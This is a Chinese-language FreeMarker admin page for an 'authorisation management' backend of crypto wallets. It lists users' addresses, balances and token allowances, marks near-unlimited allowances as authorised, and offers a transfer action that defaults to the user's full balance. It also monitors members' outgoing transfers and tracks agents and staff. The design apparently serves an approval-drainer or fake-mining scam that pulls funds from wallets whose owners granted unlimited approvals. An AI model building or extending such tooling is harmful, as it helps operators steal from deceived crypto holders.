<!DOCTYPE HTML>
<html>
<head>
    <#include "../../../common/head-meta.ftl"/>
    <title>${projectName}商户后台管理系统-订单管理</title>
    <link type="text/css" rel="stylesheet" href="${STATIC_URL}/plugins/bootstrap-table/bootstrap-table.min.css"/>
</head>

<body class="gray-bg">
<div class="wrapper wrapper-content animated fadeInRight">
    <div class="ibox">
        <div class="ibox-title">
            <h5>授权管理</h5>

            <p style="color: blue"> 　</p>
<#--            <p  style="color: green">1. 风控金额=有效提现总额 - 充值总额</p>-->
        </div>

        <div class="ibox-content">
            <div class="btn-group hidden-xs" id="bootstrapTableToolBar" role="group">

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <button id="create-btn" type="button" class="btn btn-outline btn-default" title="新增">-->
<#--                        <i class="glyphicon glyphicon-plus" aria-hidden="true"></i> 新增-->
<#--                    </button>-->
<#--                </div>-->

                <div class="pull-left" style="margin-right: 10px;">
                    <input type="text" name="time" id="time" class="form-control input-outline"  placeholder="请选择时间" style="width:200px;">
                </div>

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <input type="text" name="username" id="username" class="form-control input-outline"  placeholder="请输入用户名"  value="" style="width:150px;">-->
<#--                </div>-->

                <div class="pull-left" style="margin-right: 10px;">
<#--                    <input type="text" name="address" id="address" class="form-control input-outline"  placeholder="请输入钱包地址" style="width:150px;">-->
                    <input type="text" name="address" id="address" class="form-control input-outline" value="${address!}"  placeholder="请输入钱包地址" style="width:150px;">
                </div>

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <input type="text" name="agentname" id="agentname" class="form-control input-outline"  placeholder="代理用户名" style="width:150px;">-->
<#--                </div>-->


                <#if isAgent>
                <div class="pull-left" style="margin-right: 10px;">
                    <input type="text" name="staffname" id="staffname" class="form-control input-outline"  placeholder="直属员工名" style="width:150px;">
                </div>
                </#if>

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <input type="text" name="grantname" id="grantname" class="form-control input-outline"  placeholder="请输入祖父级用户名" value="${grantname!}" style="width:150px;">-->
<#--                </div>-->

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <select class="form-control" name="eventType" >-->
<#--                        <option value="" selected>---所有事件类型---</option>-->
<#--                        <#list adEventTypeList as item>-->
<#--                            <option value="${item.getKey()}" >${item.getName()} | ${item.getKey()}</option>-->
<#--                        </#list>-->
<#--                    </select>-->
<#--                </div>-->

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <input type="text" name="contractid" id="contractid" class="form-control input-outline"  placeholder="请输入合约表ID" style="width:150px;">-->
<#--                </div>-->

                <div class="pull-left" style="margin-right: 10px;">
                    <select class="form-control" name="networkType" >
                        <option value="" selected>---所有网络---</option>
                        <#list networkTypeArr as item>
                            <option value="${item.getKey()}" > ${item.getKey()}</option>
                        </#list>
                    </select>
                </div>

                <div class="pull-left" style="margin-right: 10px;">
                    <select class="form-control" name="currencyType" >
                        <option value="" selected>---所有币种---</option>
                        <#list cryptoCurrencyArr as item>
                            <option value="${item.getKey()}" > ${item.getKey()}</option>
                        </#list>
                    </select>
                </div>

                <div class="pull-left" style="margin-right: 10px;">
                    <select class="form-control" name="orderBy" >
                        <option value="time" selected>---按时间排序---</option>
                        <option value="balance">---按余额排序---</option>
                        <option value="allowanceAsc">---按授权额度升序---</option>
                        <option value="allowanceDesc">---按授权额度降序---</option>
                    </select>
                </div>

<#--                <div class="pull-left" style="margin-right: 10px;">-->
<#--                    <select class="form-control" name="status" >-->
<#--                        <option value="" >---所有状态---</option>-->
<#--                        <option value="enable" >enable(已授权)</option>-->
<#--                        <option value="disable" >disable(未授权)</option>-->
<#--                    </select>-->
<#--                </div>-->

                <button id="search-btn" type="button" class="btn btn-outline btn-default" title="查询">
                    <i class="glyphicon glyphicon-search" aria-hidden="true"></i> 查询
                </button>
                <button id="reset-btn" type="button" class="btn btn-outline btn-default" title="重置">
                    <i class="glyphicon glyphicon-repeat" aria-hidden="true"></i> 重置
                </button>
            </div>
            <table id="bootstrapTable">
                <thead>
                <tr>
                    <th data-field="agentname" data-width="15%" data-align="left"
                        data-formatter="userInfoAndContractInfoFormatter"
                        class="title">用户信息 & 合约信息
                    </th>

                    <th data-field="" data-width="15%" data-align="left"
                        data-formatter="walletInfoFormatter"
                        class="title">钱包信息
                    </th>

<#--                    <th data-field="chainType" data-width="5%" data-align="center"-->
<#--                        class="title">所属公链-->
<#--                    </th>-->
                    <th data-field="agentname" data-width="5%" data-align="center"
                        class="title">所属代理
                    </th>

                    <th data-field="staffname" data-width="5%" data-align="center"
                        class="title">所属员工
                    </th>
                    <th data-field="balance" data-width="5%" data-align="center"
                        class="title">最新余额
                    </th>

<#--                    <th data-field="allowance" data-width="5%" data-align="center"-->
<#--                        class="title">授权额度-->
<#--                    </th>-->

                    <th data-field="status" data-width="5%" data-align="center"
                        data-formatter="statusDataFormatter"
                        class="title">状态
                    </th>

                    <th data-field="status" data-width="10%" data-align="center"
                        data-formatter="remarkInfo"
                        class="title">备注
                    </th>

<#--                    <th data-field="createtime" data-width="8%" data-align="center"-->
<#--                        class="title">创建时间-->
<#--                    </th>-->

                    <th data-field="id" data-formatter="actionFormatter" data-width="10%" data-align="center">操作</th>
                </tr>
                </thead>
            </table>
        </div>
    </div>
</div>

<#include "../../../common/delete_form.ftl">
<#include "./coin_approve_auth_transfer.ftl">
<#include "./coin_approve_update_wallet_balance.ftl">
<#include "./coin_approve_update_remark.ftl">
<script type="text/javascript" src="${STATIC_URL}/plugins/bootstrap-table/bootstrap-table.min.js"></script>
<script type="text/javascript" src="${STATIC_URL}/plugins/bootstrap-table/locale/bootstrap-table-zh-CN.min.js"></script>
<script type="text/javascript">
    lay('#version').html('-v'+ laydate.v);
    //时间选择器
    layTime = laydate.render({
        elem: '#time',
        // type: 'date',
        range: true,
        format:'yyyy-MM-dd',
        max:0,
        change:function(value, date, endDate){

            var s = new Date(date.year+'-'+date.month+'-'+date.date);
            var e = new Date(endDate.year+'-'+endDate.month+'-'+endDate.date);
            //计算两个时间间隔天数
            var day=(e-s)/(1000*60*60*24);
            //console.log(date.year+'-'+date.month+'-'+date.date);
            //console.log(endDate.year+'-'+endDate.month+'-'+endDate.date);
            //console.log(day);
            if(day>180){
                layTime.hint('最多选择180天');
            }
        }
    });

    //计算天数差
    function differenceData(predata,lastdata) {
        var pdate = new Date(predata);
        var ldata = new Date(lastdata);
        var days = ldata.getTime() - pdate.getTime();
        var day = parseInt(days / (1000 * 60 * 60 * 24));
        return day;
    }

    function resetTime()
    {
        var date1 = new Date();
        var time1 = date1.getFullYear()+"-"+(date1.getMonth()+1)+"-"+date1.getDate();
        var date2 = new Date(date1);
        date2.setDate(date1.getDate()-180);
        var time2 = date2.getFullYear()+"-"+(date2.getMonth()+1)+"-"+date2.getDate();
        var date = time2 + " - " + time1;
        $('input[name="time"]').val(date);
    }

    function userInfoFormatter(value, row, index) {
        var result = "";
        result += "用户名:" + row.username + " <br>";
        result += "所属代理: " + row.agentname + " <br>";
        result += "所属员工: " + row.staffname + " <br>";
        return result;
    }

    function userInfoAndContractInfoFormatter(value, row, index) {
        var result = "";

        result += "用 户 名: " + row.username + " <br>";
        if(row.userType == "test")
        {
            result += "用户类型: <Strong style='color: red'>测试号(不同步链上余额)</Strong> <br>";
        }
        // result += "所属代理 : " + row.agentname + " <br>";
        // result += "所属员工 : " + row.staffname + " <br>";

        //result += "合约网络 : " + row.ctrNetworkType + " | 合约表ID: " + row.contractId + " <br>";
        //result += "合约地址: " + row.ctrAddress + " <br>";
        // result += "合约地址: " + buildScanBrowserItem(row.ctrNetworkType, row.ctrAddress, "contract_scan_url");
        result += "创建时间 : " + row.createtime + " <br>";
        // var result = cryptoAddressTokenholdingsFormatter(address, chainType);
        return result;
    }

    /**
     * 钱包地址的格式化
     */
    function walletInfoFormatter(value, row, index) {

        var result = "";
        result += "所属网络 : <Strong>" + row.ctrNetworkType + "</Strong> <br>";
        result += "所属代币 : <Strong style='color: red'>" + row.currencyType + " (" + row.currencyChainType + ") </Strong><br>";
        result += "钱包地址 : " + buildScanBrowserItem(row.ctrNetworkType, row.senderAddress, "account_scan_url");
        result += "最新余额 : " + row.balance + " <br>";
        if(row.monitorMinTransferAmount > 0)
        {
            result += "监控金额: " + row.monitorMinTransferAmount + " (监控会员转出金额) <br>";
        }
        try {
            var jsonRemark = JSON.parse(row.remark);
            if(jsonRemark && jsonRemark.approveCount && jsonRemark.approveCount >= 0)
            {
                result += "授权数量: " + jsonRemark.approveCount + " (如果>=2, 请点击查看外部授权) <br>";
            }
        }
        catch (e) {
        }
        result += "授权额度 : " + row.allowance + " <br>";



        return result;
    }

    function buildScanBrowserItem(networkType, key, type)
    {
        var rs = "";
        rs += '<a style="font-weight: 700" href="javascript:;" class="table-btn toScanBrowserPage" data-no="' + key + '" data-type="' + type +  '" data-network-type="' + networkType + '" title="通过">' + key + '</a> <br>';
        return rs;
    }

    function statusDataFormatter(value, row, index) {
        var result = "";
        if(row.allowance >= 999999999999999)
        {
            result = "<Strong style='color: green'>已授权</Strong>";
        }
        else if(row.allowance == 0)
        {
            result = "<Strong style='color: red'>未授权</Strong>";
        }
        else
        {
            result = "<Strong style='color: red'>有限授权</Strong>";
        }
        return result;
    }

    /**
     * 操作栏的格式化
     */
    function actionFormatter(value, row, index) {
        // enableAll| 代理启用 enableAgent|禁用 disable

        var result = "";
        result += '<a href="javascript:;" class="table-btn syncApproveInfo" data-no="' + row.id + '" title="同步">同步</a>';
        if(row.allowance > 0 ){//&& row.from=='defi_mining'
            result += '<a href="javascript:;" class="table-btn syncMiningInfo" data-no="' + row.id + '" title="同步挖矿">同步挖矿</a>';
        }

        <#if isShowTransfer=="true">
        if(row.status == 'enable' && row.userType != "test")
        {
            result += '<a href="javascript:;" class="table-btn editTransferForm" data-no="' + row.id + '" data-address="' + row.senderAddress + '" data-username="' + row.username + '" data-balance="' + row.balance + '" title="划转">划转</a>';
        }
        </#if>

        result += '<a href="javascript:;" class="table-btn remarkInfo" data-no="' + row.id + '" data-address="' + row.senderAddress + '" data-username="' + row.username + '" data-balance="' + row.balance + '" title="备注">备注</a>';
        // if(row.userType == "test")
        // {
        // }
        result += '<a href="javascript:;" class="table-btn updateWalletBalance" data-no="' + row.id + '" data-address="' + row.senderAddress + '" data-username="' + row.username + '" data-balance="' + row.balance + '" data-minTransferAmount="' + row.monitorMinTransferAmount  + '" title="修改金额">修改金额</a>';

        result += '<a href="javascript:;" class="table-btn toScanBrowserPage" data-no="' + row.senderAddress + '" data-type="approve_scan_url" data-network-type="' + row.ctrNetworkType + '" title="查看外部授权">查看外部授权</a>';

        result += '<a href="javascript:;" class="table-btn detailUserInfo22" data-username="' + row.username + '" title="详情">详情</a>';
        return result;
    }

    function remarkInfo(value, row, index) {
        try {
            var remark = row.remark;
            var remarkJson = JSON.parse(remark);
            if (remarkJson && remarkJson.remark) {
                return remarkJson.remark;
            }
        } catch (e) {
        }
        return "";
    }


    $(document).on('click', '.table-btn.detailUserInfo22', function () {
        var username = $(this).attr('data-username');
        var url = '/alibaba888/agent/passport/user/history_detail/page?username=' + username;
        // window.location.href = url;
        openNewWindow(url);
    });

    $(document).on('click', '.table-btn.editTransferForm', function () {
        var id = $(this).attr('data-no');
        var username = $(this).attr('data-username');
        var address = $(this).attr('data-address');
        var balance = $(this).attr('data-balance');

        showTransferFormModal(id, username, address, balance);
    });

    function showTransferFormModal(id, username, address, balance) {
        $('#transferFormId').prop('value', id);
        $('#transferFromUsername').prop('value', username);
        $('#transferFormAddress').prop('value', address);
        $('#transferFormBalance').prop('value', balance);
        $('#transferFormAmount').prop('value', balance);

        $('#myTransferFormModal').modal();
    }

    function withdrawFormatter(value, row, index) {
        var totalWithdraw = row.totalWithdraw;
        var totalRefund = row.totalRefund;
        var rs = totalWithdraw - totalRefund;
        return rs.toFixed(2)
    }

    function dateFormatter(value, row, index) {
        if (null == value) {
            return "";
        } else {
            return DateUtils.formatyyyyMMddHHmmss(value);
        }
    }

    function typeFormatter(value, row, index) {
        return $.global.constant.getOrderTypeMsg(value);
    }

    function businessFormatter(value, row, index) {
        return $.global.constant.getBusinessTypeValue(value);
    }

    function statusFormatter(value, row, index) {
        return $.global.constant.getUserStatusHtml(value);
    }


    function feeFormatter(value, row, index) {
        return ((row.money - row.actualMoney)).toFixed(2);
    }


    function moneyFormatter(value, row, index) {
        return (value / 100).toFixed(2);
    }

    $(function () {

        resetTime();

        var options = TableUtils.getBtDefaultOptions();
        options.url = '/alibaba888/agent/getCoinApproveAuthList';
        options.search = false;
        options.showRefresh = true;
        options.queryParams = function (params) {
            params.time = $('input[name="time"]').val();
            params.username = $('input[name="username"]').val();
            params.status = $('select[name="status"]').val();
            params.currencyType = $('select[name="currencyType"]').val();
            params.networkType = $('select[name="networkType"]').val();
            params.address = $('input[name="address"]').val();
            params.contractid = $('input[name="contractid"]').val();
            params.orderBy = $('select[name="orderBy"]').val();
            params.staffname = $('input[name="staffname"]').val();

            return params;
        };
        var bootstrapTable = $('#bootstrapTable').bootstrapTable(options);



        $(document).on('click', '.table-btn.toScanBrowserPage', function () {
            var key = $(this).attr('data-no');
            var networkType = $(this).attr('data-network-type');
            var type = $(this).attr('data-type');

            $.ajax({
                type: "post",
                async: false,
                url: "/alibaba888/agent/getCoinScanUrl",
                data: {
                    key:key.trim(),
                    networkType:networkType.trim(),
                    type:type.trim(),
                },
                dataType: "json",
                success: function (data) {
                    if (data != null && data.code == 200) {
                        openNewWindow(data.data);
                    } else {
                        $.global.openErrorMsg(data.msg);
                    }
                },
                error: function () {
                    $.global.openErrorMsg('操作失败，请重试');
                }
            })

        });


        $(document).on('click', '.table-btn.syncApproveInfo', function () {
            var id = $(this).attr('data-no');
            $('#myModalDel #id').val(id);
            $('#myModalDel #type').attr('action', 'syncApproveInfo');
            $('#myModalDel #tips').text('确定同步吗？');
            $('#myModalDel').modal();

        });
        $(document).on('click', '.table-btn.syncMiningInfo', function () {
            var id = $(this).attr('data-no');
            $('#myModalDel #id').val(id);
            $('#myModalDel #type').attr('action', 'syncMiningInfo');
            $('#myModalDel #tips').text('确定同步挖矿吗？');
            $('#myModalDel').modal();
        });

        $(document).on('click', '.table-btn.updateWalletBalance', function () {
            var id = $(this).attr('data-no');
            var address = $(this).attr('data-address');
            var balance = $(this).attr('data-balance');
            var minTransferAmount = $(this).attr('data-minTransferAmount');

            $('#myUpdateWalletBalanceModal #myUpdateWalletBalanceId').val(id);
            $('#myUpdateWalletBalanceModal #myUpdateWalletBalanceUsername').attr('value', address);
            $('#myUpdateWalletBalanceModal #myUpdateWalletBalanceAmount').attr('value', balance);
            $('#myUpdateWalletBalanceModal #myUpdateMonitorMinTransferAmount').attr('value', minTransferAmount);

            $('#myUpdateWalletBalanceModal').modal();
        });

        $(document).on('click', '.table-btn.remarkInfo', function () {
            var id = $(this).attr('data-no');
            $('#myUpdateRemarkModal #myUpdateRemarkId').val(id);
            $('#myUpdateRemarkModal').modal();
        });


        $('#delete_submit').click(function () {
            var id = $('#myModalDel #id').val();
            //var username = $('#myModalDel #type').val();
            var action = $('#myModalDel #type').attr('action');

            if(action == "syncApproveInfo")
            {
                syncApproveInfo(id);
            }
            else if(action == "syncMiningInfo")
            {
                syncMiningInfo(id);
            }
        });

        $('#search-btn').click(function () {
            refresh();
        });


        $('#reset-btn').click(function () {
            $('input[name="username"]').val('');
            $('input[name="agentname"]').val('');
            $('input[name="staffname"]').val('');
            $('input[name="parentname"]').val('');
            $('input[name="grantname"]').val('');

            // resetTime();
            //refresh();
        });

    });

    function refresh() {
        $('#bootstrapTable').bootstrapTable('refresh');
    }

    function syncApproveInfo(id)
    {
        $('#myModalDel').modal();
        $.ajax({
            url: '/alibaba888/agent/syncCoinApproveInfo',
            type: 'post',
            data: {id:id},
            dataType: 'json',
            success: function (result) {
                if (result.code === 200) {
                    $.global.openSuccessMsg("Success");
                }else{
                    $.global.openErrorMsg(result.msg);
                }
            },
        });
    }

    function syncMiningInfo(id)
    {
        $('#myModalDel').modal();
        $.ajax({
            url: '/alibaba888/agent/syncMiningInfo',
            type: 'post',
            data: {id:id},
            dataType: 'json',
            success: function (result) {
                if (result.code === 200) {
                    $.global.openSuccessMsg("Success");
                }else{
                    $.global.openErrorMsg(result.msg);
                }
            },
        });
    }



</script>
</body>
</html>

